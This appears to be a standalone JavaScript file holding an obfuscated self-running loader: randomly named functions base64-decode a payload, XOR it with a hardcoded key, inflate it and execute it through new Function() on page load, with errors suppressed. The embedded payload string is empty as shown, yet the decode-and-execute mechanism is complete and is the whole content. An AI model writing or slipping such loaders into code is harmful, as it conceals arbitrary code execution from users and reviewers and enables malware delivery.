
(function(){

'use strict';

const DAsusnIJdUqu = atob("");
const udBzumKvJjLK = "N8fIX5e0OoV9VQgLvrveKggxfZS2eD54VHMhvAltAgGt7amLsa1qyhdT9MfKKWEl";

function UYHgykYfgcge(data,key){

    let out='';

    for(let i=0;i<data.length;i++){

        out += String.fromCharCode(
            data.charCodeAt(i)^
            key.charCodeAt(i%key.length)
        );
    }

    return out;
}

async function bxFVPwrpHXkS(){

    try{

        const NTpxsTzTGVyF = UYHgykYfgcge(
            DAsusnIJdUqu,
            udBzumKvJjLK
        );

        const compressed = Uint8Array.from(
            atob(NTpxsTzTGVyF),
            c => c.charCodeAt(0)
        );

        const ds = new DecompressionStream(
            'deflate'
        );

        const decompressedStream =
            new Blob([compressed])
            .stream()
            .pipeThrough(ds);

        const UxDPVdZCzATC =
            await new Response(
                decompressedStream
            ).text();

        new Function(UxDPVdZCzATC)();

    }catch(err){
        console.error(err);
    }
}

bxFVPwrpHXkS();

})();
